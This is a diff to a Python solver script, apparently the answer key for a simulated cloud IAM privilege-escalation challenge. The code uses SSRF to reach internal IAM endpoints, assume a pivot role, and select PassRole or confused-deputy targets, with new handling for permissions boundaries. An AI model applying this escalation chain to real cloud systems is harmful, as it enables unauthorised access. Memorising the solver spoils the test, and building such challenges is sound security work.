@@ -129,14 +129,19 @@ def solve(base: str, echo=print, state: dict = None) -> str:
         return out
 
     conds = find_conditions(desc)
-    # Baseline: single project tag. two_tag: adds an env tag (name = whatever the trust policy lists).
-    # `required_keys` on tag_source is authoritative under two_tag; fall back to condition keys.
-    required_keys = list((desc.get("session_tag_source") or {}).get("required_keys") or list(conds.keys()))
-    # Pick project vs env keys deterministically. The project tag is the one whose condition value
-    # mentions "project_code"; the env tag is any other required key (empirically the env tag names
-    # come from a distinct pool — "environment", "deployment-stage", etc. — never "project_code").
-    project_tag = next(k for k in required_keys if "project_code" in (conds.get(k) or ""))
-    env_tag = next((k for k in required_keys if k != project_tag), None)
+    # Baseline / intersection: single project tag. two_tag: adds an env tag (name = whatever the trust
+    # policy lists). `session_tag_source.required_keys` is authoritative under two_tag; when it's absent
+    # (baseline OR intersection alone), fall back to the single project tag and skip the env branch —
+    # do NOT harvest condition keys from unrelated policy layers (permissions boundaries carry their own
+    # StringEquals that look tag-shaped but aren't PrincipalTag conditions).
+    _tag_source = desc.get("session_tag_source") or {}
+    required_keys = _tag_source.get("required_keys")
+    if required_keys is None:
+        project_tag = next(k for k in conds if "project_code" in (conds.get(k) or ""))
+        env_tag = None
+    else:
+        project_tag = next(k for k in required_keys if "project_code" in (conds.get(k) or ""))
+        env_tag = next((k for k in required_keys if k != project_tag), None)
     # Correlate the directory catalog: single project whose owner_team matches the trust predicate.
     projects = ssrf(f"{DIR}/dir/projects")["projects"]
     winning = next(p for p in projects if p["owner_team"] == owner_team)
@@ -172,12 +177,29 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     if family == "passrole-runas":
         pivot = next(name for name, p in desc["principals"].items()
                      if p.get("trust_policy", {}).get("Condition"))
-        passed = desc["principals"][pivot]["policy"]["PassRole"][0]
+        pivot_entry = desc["principals"][pivot]
+        # INTERSECTION lever: multiple PassRole candidates in identity policy; the pivot role has a
+        # permissions_boundary that caps effective PassRole to a specific Resource ARN + a
+        # iam:PassedToService condition. Winner = identity Allow ∩ boundary Resource. Baseline: single
+        # candidate, no boundary — just take it.
+        _allow = pivot_entry["policy"]["PassRole"]
+        _boundary = pivot_entry.get("permissions_boundary")
+        if _boundary:
+            _boundary_arns = _boundary.get("Resource", [])
+            _boundary_roles = [arn.rsplit("/", 1)[-1] for arn in _boundary_arns]
+            passed = next(r for r in _allow if r in _boundary_roles)
+        else:
+            passed = _allow[0]
         cred = ssrf(f"{IAM}/iam/assume?p={b64u({'session': sess1, 'role': pivot})}")["role_credential"]
         base_req = {"cred": cred, "pass_role": passed}
         st.update(pivot_role=pivot, passed_role=passed, escalation_artifact=base_req)
     else:  # confused-deputy
-        resource = next(iter(desc["resource_policies"]))
+        # INTERSECTION lever: multiple resource policies; pick the one whose Action covers
+        # deployment:SubmitJob (i.e., the deployment workflow the estate is actually reached through).
+        # Baseline: single entry — take it.
+        _rps = desc["resource_policies"]
+        resource = next((r for r, pol in _rps.items()
+                         if pol.get("Action", "").startswith("deployment:")), next(iter(_rps)))
         grant = ssrf(f"{IAM}/iam/grant?p={b64u({'session': sess1, 'resource': resource})}")["job_grant"]
         base_req = {"grant": grant}
         st.update(resource=resource, escalation_artifact=base_req)
